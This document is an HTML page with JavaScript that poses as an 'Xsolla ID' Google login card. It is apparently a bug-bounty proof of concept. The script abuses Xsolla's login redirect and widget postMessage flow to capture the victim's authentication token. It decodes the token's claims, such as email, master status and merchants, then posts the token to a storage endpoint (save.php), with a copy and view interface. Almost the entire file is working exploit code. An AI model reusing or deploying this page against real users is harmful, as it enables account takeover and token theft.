!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Xsolla ID</title>
<style>
  :root{
    --bg:#05030f; --card:#171436; --card-hi:#241d5c;
    --line:#3a2f7a; --line-hi:#5b49b8;
    --text:#f3efff; --muted:#a79ed6; --dim:#756cad;
    --ok:#2ee6a8; --xs:#ff5c8a; --violet:#8b5cf6; --cyan:#22d3ee;
    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;padding:28px 20px;display:grid;place-items:center;
    background:var(--bg);color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,system-ui,"Segoe UI",sans-serif;
    -webkit-font-smoothing:antialiased;overflow-x:hidden;
  }
  body::before{
    content:"";position:fixed;inset:0;pointer-events:none;
    background:
      radial-gradient(680px 420px at 12% -8%,rgba(34,211,238,.22),transparent 68%),
      radial-gradient(720px 460px at 88% -4%,rgba(255,92,138,.22),transparent 68%),
      radial-gradient(820px 560px at 50% 112%,rgba(139,92,246,.26),transparent 70%);
  }
  .card{
    position:relative;z-index:1;width:100%;max-width:600px;
    padding:30px 28px 26px;border:1px solid transparent;border-radius:24px;
    background:
      linear-gradient(180deg,var(--card-hi),var(--card) 62%) padding-box,
      linear-gradient(140deg,rgba(34,211,238,.7),rgba(139,92,246,.55) 42%,rgba(255,92,138,.7)) border-box;
    box-shadow:
      0 30px 80px rgba(0,0,0,.62),
      0 1px 0 rgba(255,255,255,.07) inset,
      0 0 90px rgba(139,92,246,.12);
    text-align:center;
  }
  .head{display:flex;flex-direction:column;align-items:center;gap:14px;margin-bottom:22px}
  .mark{
    width:54px;height:54px;display:grid;place-items:center;border-radius:17px;
    font-size:24px;font-weight:800;color:#fff;
    background:linear-gradient(140deg,var(--cyan),var(--violet) 52%,var(--xs));
    box-shadow:0 14px 34px rgba(139,92,246,.42),0 0 44px rgba(34,211,238,.24),
               0 1px 0 rgba(255,255,255,.28) inset;
  }
  h1{margin:0;font-size:19px;font-weight:650;letter-spacing:-.015em}

  .wire-wrap{
    display:flex;flex-direction:column;overflow:hidden;
    border:1px solid transparent;border-radius:18px;
    background:
      linear-gradient(180deg,#0e0a1c,#0b0817) padding-box,
      linear-gradient(140deg,rgba(34,211,238,.5),rgba(139,92,246,.4),rgba(255,92,138,.5)) border-box;
    box-shadow:0 22px 60px rgba(0,0,0,.55),0 0 70px rgba(139,92,246,.10);
  }
  .wire-bar{
    display:flex;align-items:center;gap:8px;flex:none;padding:11px 14px;
    font-size:11.5px;color:var(--muted);border-bottom:1px solid var(--line);
    background:linear-gradient(180deg,#241d5c,#1a1543);
  }
  .wire-bar .dot{width:7px;height:7px;border-radius:50%;background:var(--cyan);
    box-shadow:0 0 9px rgba(34,211,238,.9)}
  .wire{max-height:430px;overflow-y:auto;padding:9px 12px;
    font-family:var(--mono);font-size:10.5px;line-height:1.5;text-align:left;
    scrollbar-width:thin;scrollbar-color:#3a2f7a transparent}
  .wire::-webkit-scrollbar{width:8px}
  .wire::-webkit-scrollbar-thumb{background:#3a2f7a;border-radius:8px}
  .line{padding:6px 0;border-bottom:1px solid #1d1730}
  .line:last-child{border-bottom:0}
  .line .hd{display:flex;align-items:baseline;gap:6px;flex-wrap:wrap}
  .line .arw{font-weight:800;font-size:12px}
  .line.out .arw{color:var(--xs)}
  .line.in .arw{color:var(--ok)}
  .line.sys .arw{color:var(--dim)}
  .line .ts{color:var(--dim);font-size:9.5px}
  .line .ty{color:var(--text);font-weight:650}
  .line .org{color:var(--muted);font-size:9.5px}
  .line .pl{margin:3px 0 0;white-space:pre-wrap;word-break:break-all;
    color:#9d95b8;font-size:10px;line-height:1.5}
  .line .pl .hl{color:#ffd479;font-weight:700}
  .line.key{background:rgba(46,230,168,.05);border-radius:8px;
    padding-left:7px;padding-right:7px;margin:0 -7px}
  .line.key .ty{color:var(--ok)}

  .result{display:none;text-align:left}
  .card.done .result{display:block;margin-bottom:18px;animation:rise .34s cubic-bezier(.2,.7,.3,1) both}
  .chips{display:flex;flex-wrap:wrap;justify-content:center;gap:7px;margin-bottom:14px}
  .chip{padding:6px 10px;border-radius:9px;font-family:var(--mono);font-size:11px;
    color:var(--text);background:#0d0a1b;border:1px solid var(--line)}
  .chip b{color:var(--dim);font-weight:500}
  .chip.good{border-color:rgba(46,230,168,.34)}
  .chip.good b{color:var(--ok)}
  .token{display:block;width:100%;margin:0 0 14px;padding:14px;
    font-family:var(--mono);font-size:10.5px;line-height:1.7;color:var(--ok);
    background:#05040b;border:1px solid rgba(46,230,168,.28);border-radius:14px;
    white-space:pre-wrap;word-break:break-all;max-height:220px;overflow:auto;
    scrollbar-width:thin;scrollbar-color:#3a2f7a transparent}
  .ghost{display:block;width:100%;padding:13px;font:inherit;font-size:13px;font-weight:650;
    text-align:center;color:var(--text);background:#0d0a1b;border:1px solid var(--line-hi);
    border-radius:13px;cursor:pointer}
  .ghost:hover{background:#141029;border-color:#4a3d72}
  .ghost.ok{color:var(--ok);border-color:rgba(46,230,168,.4)}
  .row{display:flex;gap:10px}
  .social{
    display:flex;align-items:center;justify-content:center;gap:10px;
    width:100%;margin-top:16px;padding:15px;font:inherit;font-size:14px;font-weight:650;
    color:#fff;border:0;border-radius:13px;cursor:pointer;
    background:linear-gradient(180deg,#2f8bf5,#1877f2);
    box-shadow:0 10px 26px rgba(24,119,242,.34),0 1px 0 rgba(255,255,255,.22) inset;
  }
  .social:hover{background:linear-gradient(180deg,#3d95f7,#1b7ae8)}
  .social:active{transform:translateY(1px)}
  .social svg{width:18px;height:18px;flex:none;fill:#fff}
  .card.done .social{display:none}
  @keyframes rise{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
</style>
</head>
<body>

<div class="card" id="card">
  <div class="head">
    <div class="mark">X</div>
    <h1>Xsolla ID</h1>
  </div>

  <div class="result">
    <div class="chips" id="chips"></div>
    <pre class="token" id="token"></pre>
    <div class="row">
      <button class="ghost" id="copy">Copy token</button>
      <button class="ghost" id="view">View token</button>
    </div>
  </div>

  <div class="wire-wrap">
    <div class="wire-bar"><span class="dot"></span>postMessage traffic</div>
    <div class="wire" id="wire"></div>
  </div>

  <button class="social" id="go">
    Login on Xsolla with Google
  </button>
</div>

<script>
(() => {
  const PID        = '40db2ea4-5d42-11e6-a3ff-005056a0e04a';
  const REGISTERED = 'https://business-accounts.xsolla.com/xsolla_login/session';
  const SINK       = 'https://xl-widget.xsolla.com/auth.html??';
  const WIDGET     = 'https://xl-widget.xsolla.com';
  const PROBE      = 'ARM-PROBE-';
  const SLOT       = 'xltoken.slot';
  const CANARY     = new URLSearchParams(location.search).get('mode') === 'canary';
  const STORE      = new URLSearchParams(location.search).get('store') || 'save.php';

  const $ = id => document.getElementById(id);
  const card = $('card');
  let popup = null, last = null, fired = false, done = false;
  const seen = new Set(), held = [];

  window.addEventListener('pagehide', () =>
    held.forEach(u => { try { URL.revokeObjectURL(u); } catch (_) {} }));

  const esc = s => String(s).replace(/[&<>]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));

  function ts() {
    const d = new Date(), p = n => String(n).padStart(2, '0');
    return p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
  }

  function wire(dir, type, payload, origin, key) {
    const json = payload === undefined ? '' : JSON.stringify(payload);
    const safe = esc(json).replace(/"urlParams"/g, '<b class="hl">"urlParams"</b>');
    const row = document.createElement('div');
    row.className = 'line ' + (key ? 'key ' : '') + dir;
    row.innerHTML =
      '<div class="hd">' +
        '<span class="arw">' + (dir === 'out' ? '→' : dir === 'in' ? '←' : '·') + '</span>' +
        '<span class="ts">' + ts() + '</span>' +
        '<span class="ty">' + esc(type) + '</span>' +
        (origin ? '<span class="org">' + esc(origin) + '</span>' : '') +
      '</div>' + (json ? '<pre class="pl">' + safe + '</pre>' : '');
    $('wire').appendChild(row);
    $('wire').scrollTop = $('wire').scrollHeight;
  }

  const authUrl = () =>
    WIDGET + '/auth.html?token=' + PROBE + 'direct1&code=' + PROBE + 'direct2&note=relayed-verbatim';

  const loginUrl = () =>
    'https://login.xsolla.com/api/social/google/login_redirect' +
    '?fields=email' +
    '&projectId=' + encodeURIComponent(PID) +
    '&login_url=' + encodeURIComponent(REGISTERED) +
    '&payload=' + encodeURIComponent('{"filters":null}') +
    '&redirect_url=' + encodeURIComponent(SINK);

  function claimsOf(token) {
    const p = token.split('.');
    if (p.length !== 3) return null;
    try {
      const b = p[1].replace(/-/g, '+').replace(/_/g, '/');
      return JSON.parse(decodeURIComponent(escape(atob(b + '='.repeat((4 - b.length % 4) % 4)))));
    } catch (_) { return null; }
  }

  function slot() {
    let n = 0;
    try { n = parseInt(localStorage.getItem(SLOT) || '0', 10) || 0; } catch (_) {}
    n += 1;
    try { localStorage.setItem(SLOT, String(n)); } catch (_) {}
    return n;
  }

  function save(token, claims) {
    const name = 'xltoken' + slot() + '.txt';
    const lines = [
      'report:   '+ name,
      'created:  '+ new Date().toISOString(),
    ];
    if (claims) {
      ['email', 'name', 'provider', 'is_master'].forEach(k => {
        if (claims[k] !== undefined) lines.push(k + ': ' + claims[k]);
      });
      if (claims.partner_data && claims.partner_data.merchants)
        lines.push('merchants: ' + JSON.stringify(claims.partner_data.merchants));
      if (claims.exp) lines.push('expires:   ' + new Date(claims.exp * 1000).toISOString());
    }
    lines.push('', token, '');
    const body = lines.join('\n');

    const rec = { name: name, url: '' };
    rec.ready = fetch(STORE, { method: 'POST', body: new URLSearchParams({ name: name, body: body }) })
      .then(r => r.json())
      .then(j => {
        if (!j || !j.ok || !j.url) throw new Error((j && j.error) || 'save rejected');
        rec.url = j.url;
        return rec;
      })
      .catch(() => {
        const url = URL.createObjectURL(new Blob([body], { type: 'text/plain' }));
        held.push(url);
        rec.url = url;
        wire('sys', 'store unreachable — local blob', { file: name });
        return rec;
      });
    return rec;
  }

  function capture(token) {
    if (seen.has(token)) return;
    seen.add(token);
    const claims = claimsOf(token);
    last = save(token, claims);

    $('token').textContent = token;
    const rows = [];
    if (claims) {
      if (claims.email)     rows.push(['email', claims.email, 1]);
      if (claims.name)      rows.push(['name', claims.name, 0]);
      if (claims.is_master) rows.push(['is_master', claims.is_master, 1]);
      if (claims.provider)  rows.push(['provider', claims.provider, 0]);
      if (claims.exp)       rows.push(['expires', new Date(claims.exp * 1000).toISOString().slice(0, 10), 0]);
    }
    $('chips').innerHTML = rows
      .map(([k, v, good]) => '<span class="chip' + (good ? ' good' : '') + '"><b>' + k + '</b> ' + esc(v) + '</span>')
      .join('');

    done = true;
    card.classList.add('done');
  }

  window.addEventListener('message', e => {
    const d = e.data || {};
    if (d.type !== 'AUTHENTICATED') return;
    const p = d.urlParams || {};
    const tok = p.token || p.code;
    wire('in', 'AUTHENTICATED', d, e.origin, !!tok);
    if (e.origin !== WIDGET || !tok) return;
    if (String(tok).indexOf(PROBE) === 0) return;
    capture(tok);
  });

  function fire() {
    if (fired || done || popup) return;
    const url = CANARY ? authUrl() : loginUrl();
    wire('out', 'window.open', CANARY
      ? { url: WIDGET + '/auth.html', token: PROBE + '…' }
      : { login_url: REGISTERED, redirect_url: SINK });
    popup = window.open(url, '_blank');
    if (!popup) {
      fired = false;
      wire('sys', 'popup blocked — click anywhere');
      return;
    }
    fired = true;
    const t = setInterval(() => {
      if (popup && popup.closed) { popup = null; clearInterval(t); }
    }, 800);
  }

  $('go').addEventListener('click', () => { fired = false; fire(); });

  $('copy').addEventListener('click', () => {
    navigator.clipboard.writeText($('token').textContent);
    $('copy').textContent = 'Copied';
    $('copy').classList.add('ok');
    setTimeout(() => { $('copy').textContent = 'Copy token'; $('copy').classList.remove('ok'); }, 1200);
  });

  $('view').addEventListener('click', () => {
    if (!last) return;
    const btn = $('view');
    btn.textContent = '…';
    last.ready.then(r => {
      if (r.url) window.open(r.url, '_blank');
      btn.textContent = r.url ? 'Opened' : 'No report';
      btn.classList.add('ok');
      setTimeout(() => { btn.textContent = 'View token'; btn.classList.remove('ok'); }, 1200);
    });
  });
})();
</script>
</body>
</html>
